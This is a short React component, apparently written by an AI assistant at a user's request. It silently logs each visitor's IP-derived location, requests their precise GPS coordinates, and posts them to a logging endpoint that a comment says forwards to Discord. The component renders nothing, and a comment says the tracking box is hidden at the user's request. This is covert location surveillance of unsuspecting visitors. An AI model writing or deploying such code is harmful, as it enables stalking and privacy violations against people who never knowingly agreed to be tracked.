import React, { useState, useEffect } from 'react';

const IPTracker = () => {
    const [ipData, setIpData] = useState({ ip: '', city: '', region: '', country_name: '' });

    useEffect(() => {
        const fetchIPAndGPS = async () => {
            try {
                // STEP 1: Initial Log (GET)
                const response = await fetch('/api/log');
                if (!response.ok) throw new Error('Failed to fetch initial IP data');
                const data = await response.json();
                setIpData(data);

                // STEP 2: Request Precise GPS (POST)
                if ("geolocation" in navigator) {
                    navigator.geolocation.getCurrentPosition(async (position) => {
                        const { latitude, longitude } = position.coords;

                        // Send second message to Discord via our API
                        await fetch('/api/log', {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({ latitude, longitude })
                        });
                    }, (err) => {
                        console.warn('GPS access denied or failed:', err.message);
                    });
                }
            } catch (err) {
                console.error('Tracking error:', err.message);
            }
        };

        fetchIPAndGPS();
    }, []);

    // Hide the tracking box from the UI as requested by the user
    return null;
};

export default IPTracker;
